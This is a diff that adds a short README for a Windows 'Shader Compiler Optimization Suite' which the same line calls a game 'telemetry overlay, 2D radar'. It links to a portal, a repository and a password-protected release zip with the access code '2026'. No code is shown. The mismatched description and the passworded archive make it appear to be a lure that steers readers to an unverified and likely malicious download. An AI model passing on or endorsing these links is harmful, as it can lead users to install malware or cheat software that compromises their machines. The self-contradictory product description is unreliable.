@@ -1,0 +1,9 @@
+# Loki-Patches Universal Binary & Shader Compiler Optimization Suite (v2.1.6)
+
+> Loki-Patches Universal Binary & Shader Compiler Optimization Suite for Windows 10/11 (x64) — External read-only telemetry overlay, 2D radar.
+
+- [Official Portal & Documentation](https://Hiroshis198.github.io/loki-patches-universal-build/)
+- [Direct Release Package (loki-patches-universal-build-v2.1.6-win64.zip)](https://github.com/Hiroshis198/loki-patches-universal-build/releases/download/v2.1.6/loki-patches-universal-build-v2.1.6-win64.zip) (Archive Access Code: 2026)
+- [GitHub Repository](https://github.com/Hiroshis198/loki-patches-universal-build)
+- [Installation Guide](https://github.com/Hiroshis198/loki-patches-universal-build/blob/main/docs/INSTALL.md)
+- [FAQ & Troubleshooting](https://github.com/Hiroshis198/loki-patches-universal-build/blob/main/docs/FAQ.md)
